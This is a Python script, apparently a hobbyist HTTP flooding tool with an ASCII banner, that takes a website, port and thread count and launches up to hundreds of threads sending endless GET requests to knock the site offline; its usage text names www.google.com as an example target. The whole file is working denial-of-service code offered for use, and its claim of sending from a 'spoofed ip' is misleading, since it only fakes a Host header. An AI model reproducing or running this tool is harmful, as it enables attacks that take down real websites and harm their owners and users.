print("""
 /$$   /$$                               /$$             /$$$$$$$$              
| $$  /$$/                              | $$            | $$_____/              
| $$ /$$/  /$$$$$$$   /$$$$$$   /$$$$$$$| $$   /$$      | $$       /$$$$$$/$$$$ 
| $$$$$/  | $$__  $$ /$$__  $$ /$$_____/| $$  /$$/      | $$$$$   | $$_  $$_  $$
| $$  $$  | $$  \ $$| $$  \ $$| $$      | $$$$$$/       | $$__/   | $$ \ $$ \ $$
| $$\  $$ | $$  | $$| $$  | $$| $$      | $$_  $$       | $$      | $$ | $$ | $$
| $$ \  $$| $$  | $$|  $$$$$$/|  $$$$$$$| $$ \  $$      | $$$$$$$$| $$ | $$ | $$
|__/  \__/|__/  |__/ \______/  \_______/|__/  \__/      |________/|__/ |__/ |__/
________________________________________________________________________________

    #################### Predator or pray, predator or pray
    # BossFight 2017   # Nock em out
    # Sweden           # Nock em out
    #################### Predator or pray, predator or pray
    
    
    Music: https://www.youtube.com/watch?v=F0PUVKfxkTM""")
# Import Zee Stuff
import socket
import threading
import sys
import time
import os
import random
from threading import Thread
from requests.structures import CaseInsensitiveDict
try:
	website = str(sys.argv[1])
except Exception:
	print("""
Usage:
python3 HTTP.py www.website.com port threads
Ex:
python3 HTTP.py www.google.com 80 100
Notes:
Don't go over 500 in threads, don't add "http://" or "https://" to website name, and change config (in the code) to True for more info when attacking.""")
	exit()
if website == "-h":
	print("""
Usage:
python3 HTTP.py www.website.com port threads
Ex:
python3 HTTP.py www.google.com 80 100
Notes:
Don't go over 500 in threads, don't add "http://" or "https://" to website name, and change config (in the code) to True for more info when attacking.""")
	exit()
if website == "help":
	print("""
Usage:
python3 HTTP.py www.website.com port threads
Ex:
python3 HTTP.py www.google.com 443 100
Notes:
Don't go over 500 in threads, don't add "http://" or "https://" to website name, and change config (in the code) to True for more info when attacking.""")
	exit()
threaddd = int(sys.argv[3])
attack_num = 0
target = website
port = int(sys.argv[2])
# Config
debug = True
# The attack
def attack():
	i = 0
	# start timer
	t0 = time.time()
	while True:
		a = random.randrange(1, 240)
		b = random.randrange(6, 240)
		c = random.randrange(3, 240)
		d = random.randrange(5, 240)
		# spoofed ip
		fake_ip = str(a) + "." + str(b) + "." + str(c) + "." + str(d)
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# connect
		s.connect((target, port))
		# attack
		s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
		global attack_num
		attack_num += 1
		i = i + 1
		# timer stuff
		t1 = time.time()
		total = t1-t0
		# If timer is more than 10 second
		if total > 10:
			# To show that it is working
			print(i)
			if debug == True:
				os.system("clear")
			if debug == False:
				print("Still killing em")
			if debug == True:
				print("""
Requests sent:
| """ + str(attack_num)  + """ |
Method:
| GET |
Website:
| """ + target + """ |
Requests per 10 seconds from each thread:
| """ + str(i) + """ |
Threads:
| """ + str(threaddd) + """ |
Spoofed ip:
| """ + str(fake_ip) + """ |""")
			t0 = time.time()
			i = 0
		s.close()
# Start threads
for i in range(threaddd):
	if debug == True:
		print("Destroyer ==> " + str(i) + " <== started")
	thread = threading.Thread(target=attack)
	thread.start()
